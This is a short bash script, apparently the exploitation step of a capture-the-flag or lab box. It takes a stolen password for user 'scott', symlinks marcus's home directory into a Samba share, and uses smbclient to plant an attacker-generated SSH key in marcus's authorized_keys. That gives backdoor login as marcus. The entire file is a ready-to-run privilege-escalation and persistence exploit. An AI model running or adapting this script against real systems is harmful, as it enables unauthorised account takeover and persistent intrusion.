#!/usr/bin/env bash
# After you have a password for user scott (from rclone reveal on-box):
# plant an SSH pubkey into ~marcus via force user + wide links.
set -euo pipefail
RHOST="${1:?usage: $0 <RHOST> <SCOTT_PASSWORD>}"
PASS="${2:?usage: $0 <RHOST> <SCOTT_PASSWORD>}"
KEY="${3:-$HOME/.ssh/marcus_abducted}"

[[ -f "$KEY" ]] || ssh-keygen -q -t ed25519 -N '' -f "$KEY" -C marcus-abducted

sshpass -p "$PASS" ssh -o StrictHostKeyChecking=accept-new "scott@${RHOST}" \
  'rm -f /srv/transfer/mh; ln -s /home/marcus /srv/transfer/mh'

smbclient "//${RHOST}/transfer" -U "scott%${PASS}" \
  -c "mkdir mh/.ssh; put ${KEY}.pub mh/.ssh/authorized_keys"

echo "[+] try: ssh -i ${KEY} marcus@${RHOST}"
